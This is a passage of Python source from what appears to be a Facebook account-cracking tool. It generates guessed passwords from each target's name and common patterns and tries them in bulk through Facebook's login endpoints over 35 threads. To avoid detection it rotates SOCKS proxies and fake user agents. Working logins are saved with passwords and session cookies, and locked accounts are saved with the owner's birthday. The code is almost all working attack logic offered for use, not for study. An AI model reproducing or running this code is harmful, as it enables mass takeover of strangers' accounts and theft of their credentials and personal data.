		anim = Progress(SpinnerColumn('bouncingBall'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		anim2 = anim.add_task('',total=len(idd))
		kotak("# BEFORE CRACK PLEASE ANSWER THE QUESTION BELOW",I, I)
		self.tanya_apk()
		self.tanya_opsi()
		self.pas_me()
		self.buat_ugen()
		self.pilih_url()
		self.pilih_mentod()
		iprint(Panel(f"{OO}IF THERE IS NO RESULT, PLEASE TURN OFF AIRCRAFT MODE{QQ}\n{II}OK RESULTS ARE SAVED TO : results/OK-{durasi}.txt\n{KK}CP RESULTS ARE SAVED TO : results/CP-{durasi}.txt{QQ}", style=Q, title="INFORMATION"))
		with anim:
			with __Kiky__(max_workers=35) as kontok:
				for kocok in id:
					try:
						idz = kocok.split('<=>')[0]
						pws = kocok.split('<=>')[1].lower()
						colmek = pws.split(' ')[0]
						pwe = []
						if len(colmek)<6:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									pass
								elif pass_ in ["02","2"]:
									pass
								elif pass_ in ["03","3"]:
									pwe.append("Nigeria")
									pwe.append("success")
									pwe.append("123456")

								elif pass_ in ["04","4"]:
									pwe.append("123456789")
									pwe.append("qwerty123")
									pwe.append("11223344")
									pwe.append("12345678")
									pwe.append("Facebook")
									pwe.append("password")
									pwe.append("Password123")
									pwe.append("PASSWORD")
									pwe.append("123456")

								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
							else:
								if pass_ in ["01","1"]:
									pwe.append(colmek+"123")
									pwe.append(colmek+"12345")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"2020")
									pwe.append(colmek+"2022")
									pwe.append(colmek+"2021")
									pwe.append(colmek+"2019")
									pwe.append(colmek+"2018")
									pwe.append(colmek+"2017")
									pwe.append(colmek+"2016")
									pwe.append(colmek+"2015")
									pwe.append(colmek+"2014")
									pwe.append(colmek+"2013")
									pwe.append(colmek+"2012")
									pwe.append(colmek+"2011")
									pwe.append(colmek+"2010")
									pwe.append(colmek+"2009")
									pwe.append(colmek+"2008")
									pwe.append(colmek+"2007")
									pwe.append(colmek+"2006")
									pwe.append(colmek+"2005")
									pwe.append(colmek+"2004")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["03","3"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									pwe.append(colmek+"1234567")
									pwe.append(colmek+"1111")
									pwe.append(colmek+"2222")
									pwe.append(colmek+"1122")
									pwe.append(colmek+"12")
									pwe.append(colmek+"112233")
									pwe.append(colmek+"102030")
									pwe.append(colmek+"0001")
									pwe.append(colmek+"000")
									pwe.append(colmek+"012")
									pwe.append(colmek+"0123")
									pwe.append(colmek+"4321")
									pwe.append(colmek+"789")
									pwe.append(colmek+"567")
									pwe.append(colmek+"3405")
									pwe.append(colmek+"1999")
									pwe.append(colmek+"00000000")
									pwe.append(colmek+"01")
									pwe.append(colmek+"02")
									pwe.append(colmek+"09")
									pwe.append(colmek+"10")
								elif pass_ in ["04","4"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)

								pwe.append(pws)
						else:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									pass
								elif pass_ in ["02","2"]:
									pass
								elif pass_ in ["03","3"]:
									pwe.append("123456789")
									pwe.append("qwerty123")
									pwe.append("Password123")

								elif pass_ in ["04","4"]:
									pwe.append("123123")
									pwe.append("12341234")
									pwe.append("1234567")
									pwe.append("789789")
									pwe.append("01020304")
									pwe.append("1234567")
									pwe.append("pantek")
									pwe.append("indonesia")
									pwe.append("sayangku")
									pwe.append("123456")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
							else:
								if pass_ in ["01","1"]:
									pwe.append(colmek+"123")
									pwe.append(colmek+"12345")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"123123")
									pwe.append(colmek+"12341234")
									pwe.append(colmek+"13579")
									pwe.append(colmek+"2458")
									pwe.append(colmek+"987")
									pwe.append(colmek+"666")
									pwe.append(colmek+"12345")
								elif pass_ in ["03","3"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["04","4"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								pwe.append(pws)



						if "mobile" == url_met:
							kontok.submit(self.method, idz, pwe,"m.facebook.com")
						elif "free" == url_met:
							kontok.submit(self.method, idz, pwe,"free.facebook.com")
						else:
							kontok.submit(self.method, idz, pwe,"mbasic.facebook.com")
#					except Exception as e:print(e)
					except:
						pass
			print()
			print()
			kotak("# CRACK DONE DONT FORGET, REST", I, C)
			os.sys.exit()

	def method_fast(self, user, memek,url):
		global ok,cp,loop
		try:
			loop += 1
			for pw in memek:
				pw = pw.lower()
				ses=requests.Session()
				ua = ("Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; GT-{str(rc(aZ))}765{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.0.{str(rr(111,999))}.{str(rr(1111,9999))} Mobile Safari/537.36")
				head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
				resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(user)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
				xo = resp.content
				if "session_key" in str(xo):
					try:
						kiky=json.loads(resp.text)
						token= kiky['access_token']
					except:
						token= "—"
					print('\r%s %s|%s|%s%s%s        '%(i,idf,pw,b,token,q))
				elif "www.facebook.com" in str(xo):
					print('\r%s %s|%s%s           '%(b,idf,pw,q))
				else:continue

			anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
			anim.advance(anim2)
		except:
			loop-=1
			self.method_fast(user, memek,url)
	def method(self, user, memek,url):
		global ok,cp,loop
		try:
			loop += 1
			for pw in memek:
				if "ke1" == method:
					pw = pw.lower()
					session=requests.Session()
					prox = open("data/prox_socks5.txt","r").read().splitlines()
					ua = random.choice(ugen_)
					proxy= {"http": f"socks5://{random.choice(prox)}"}
					headers1= {
						"Host":url,
						"upgrade-insecure-requests":"1",
						"user-agent":ua,
						"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
						"x-requested-with":"com.facebook.katana",
						"sec-fetch-site":"same-origin",
						"sec-fetch-mode":"cors",
						"sec-fetch-user":"empty",
						"sec-fetch-dest":"document",
						"referer":f"https://{url}/",
						"accept-encoding":"gzip, deflate br",
						"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
						}
					p = session.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
					data = {
						"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
						"email":user,
						"pass":pw
						}
					headers2 = {
						"Host": url,
						"cache-control":"max-age=0",
						"upgrade-insecure-requests":"1",
						"origin":f"https://{url}",
						"content-type":"application/x-www-form-urlencoded",
						"user-agent":ua,
						"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
						"x-requested-with":"com.facebook.katana",
						"sec-fetch-site":"same-origin",
						"sec-fetch-mode":"cors",
						"sec-fetch-user":"empty",
						"sec-fetch-dest":"document",
						'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
						"accept-encoding":"gzip, deflate br",
						"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
						}
					po = session.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"+yyy,data=data, headers=headers2, proxies=proxy)
				elif "ke2" == method:
					pw = pw.lower()
					ua = random.choice(ugen_)
					session=requests.Session()
					prox = open("data/prox_socks5.txt","r").read().splitlines()
					proxy= {"http": f"socks5://{random.choice(prox)}"}
					headers1= {
						"Host": url,
						"cache-control": "max-age=0",
						"user-agent": ua,
						"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
						"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
						"sec-ch-ua-mobile": "?1",
						"sec-fetch-site": "same-origin",
						"sec-fetch-mode": "cors",
						"sec-fetch-dest": "empty",
						"sec-fetch-user": "?1",
						"upgrade-insecure-requests": "1",
						"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
					p = session.get(f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
					data = {
						"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
						"uid":user,
						"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
						"pass":pw,
						"flow":"login_no_pin"}
					cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
					cookie += " m_pixel_ratio=2.625; wd=412x756"
					headers2 = {
						"Host": url,
						"connection": "keep-alive",
						"cache-control": "max-age=0",
						"save-data": "on",
						"origin": "https://m.facebook.com",
						"content-type": "application/x-www-form-urlencoded",
						"user-agent": ua,
						"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
						"x-requested-with": "com.facebook.katana",
						"dnt": "1",
						"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
						"sec-ch-ua-platform": '"Android"',
						"sec-ch-ua-mobile": "?1",
						"sec-fetch-site": "same-origin",
						"sec-fetch-mode": "cors",
						"sec-fetch-dest": "empty",
						"sec-fetch-user": "?1",
						"upgrade-insecure-requests": "1",
						"referer": f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
						"accept-encoding": "gzip, deflate br",
						"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
					po = session.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID"+yyy,data=data, headers=headers2, cookies={"cookie": cookie}, proxies=proxy, allow_redirects=False)
				elif "ke3" == method:
					pw = pw.lower()
					ua = random.choice(ugen_)
					session=requests.Session()
					prox = open("data/prox_socks4.txt","r").read().splitlines()
					proxs= {"http": f"socks4://{random.choice(prox)}"}
					session.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
					p = session.get('https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
					dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw}
					koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
					koki+=' m_pixel_ratio=2.625; wd=412x756'
					heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
					po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID'+yyy,data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)



				elif "ke4" == method:
					pw = pw.lower()
					session=requests.Session()
					prox = open("data/prox_socks4.txt","r").read().splitlines()
					proxs= {"http": f"socks4://{random.choice(prox)}"}
					ua = random.choice(ugen_)
					try:
						ua2 = random.choice(ugen2)
					except:
						ua2 = random.choice(ugen_)
					session.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
					p = session.get('https://p.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&refsrc=deprecated&_rdr')
					dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
					koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
					koki+=' m_pixel_ratio=2.625; wd=412x756'
					heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
					po= session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0'+yyy,data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)


				if 'c_user'+yyy in session.cookies.get_dict():
					play_mpv(".ok.mp3")
					print(ua)
					coki = ubah_cok(session.cookies.get_dict())
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('results/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					if "IYA" in apk_me:
						ubah_bahasa(coki)
						get_apk(user,pw,coki)
					else:
						ok_ = Tree("                                 ",highlight=True, hide_root=True)
						ok__= ok_.add(f":bolivia::oman: {o}OK ACCOUNT BRO{q}",guide_style="uu red")
						ok___ = ok__.add(f"{b}ID AND PASSWORD{q}")
						ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
						ok___ = ok__.add(f"{b}COOKIES{q}")
						ok___.add(f"{c}{coki}{q}")
						prints(ok__)
				
					self.Kontol_Kau_Ikuti(session,coki)
					break
				elif 'checkpoint'+yyy in session.cookies.get_dict():
					play_mpv(".cp.mp3")
					try:
						yz  = requests.Session().get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,tiktok),cookies=puput)
						zxc = json.loads(yz.text)
						cp_ttl= zxc['birthday']
						month, day, year = cp_ttl.split('/')
						month = bulan_ttl[month]
						ttl = f"{day}-{month}-{year}"
					except:
						ttl="—"
					wrt = '%s|%s|%s' % (user,pw,ttl)
					cp.append(wrt)
					open('results/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
					if "IYA" == opsi_y:
						try:
							hide_opsi(user,pw,ttl)
						except:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u} ACCOUNT IS CP Bro {q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID AND PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}DATE OF BIRTH{q}")
							cp___.add(f"{m}{ttl}{q}")
							prints(cp__)
					else:
						cp_ = Tree("                                 ",highlight=True, hide_root=True)
						cp__= cp_.add(f":bolivia::oman: {u} ACCOUNT IS CP Bro {q}",guide_style="uu blue")
						cp___ = cp__.add(f"{k}ID AND PASSWORD{q}")
						cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
						cp___ = cp__.add(f"{k}DATE OF BIRTH{q}")
						cp___.add(f"{m}{ttl}{q}")
						prints(cp__)
					break
				else:continue
			anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
			anim.advance(anim2)
#		except Exception as e:print(e)
		except:
			loop-=1
			self.method(user, memek,url)
	def buat_ugen(self):
	#	{str(rc(aZ))}
	#	{str(rr(111,999))}
		rr = random.randint
		rc = random.choice
		aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5\n6\n7\n8",f"UserAgent Nokia\nUserAgent UcBrowser\nUserAgent Random\nUserAgent Chorme\nUserAgent Facebook\nUserAgent By Fall\nUserAgent Choice\nManual")
		sol().print(tod, justify='center')

		pilih_ = input(f">--Pilih 1-5--> {q}")
		if pilih_ in ("1","01"):
			for x in range(2000):
				ugen_.append(f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(aZ))}{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.{str(rr(1,9))}.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/{str(rc(aZ))}{str(rr(1,9))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}")
		elif pilih_ in ("2","02"):
			for x in range(10000):
				aa='Mozilla/5.0 (Linux; U; Android'
				b=random.choice(['6','7','8','9','10','11','12'])
				c=' en-us; GT-'
				d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				e=random.randrange(1, 999)
				f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h=random.randrange(73,100)
				i='0'
				j=random.randrange(4200,4900)
				k=random.randrange(40,150)
				l='Mobile Safari/537.36'
				uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
				ugen_.append(uaku2)
		elif pilih_ in ("3","03"):
			for xd in range(10000):
				a='Mozilla/5.0 (Symbian/3; Series60/'
				b=random.randrange(1, 9)
				c=random.randrange(1, 9)
				d='Nokia'
				e=random.randrange(100, 9999)
				f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
				g=random.randrange(1, 9)
				h=random.randrange(1, 4)
				i=random.randrange(1, 4)
				j=random.randrange(1, 4)
				k='Mobile Safari/535.1'
				uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
				ugen2.append(uaku)


				aa='Mozilla/5.0 (Linux; U; Android'
				b=random.choice(['6','7','8','9','10','11','12'])
				c=' en-us; GT-'
				d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				e=random.randrange(1, 999)
				f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h=random.randrange(73,100)
				i='0'
				j=random.randrange(4200,4900)
				k=random.randrange(40,150)
				l='Mobile Safari/537.36'
				uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
				ugen_.append(uaku2)

		elif pilih_ in ("4","04"):
			for x in range(2000):
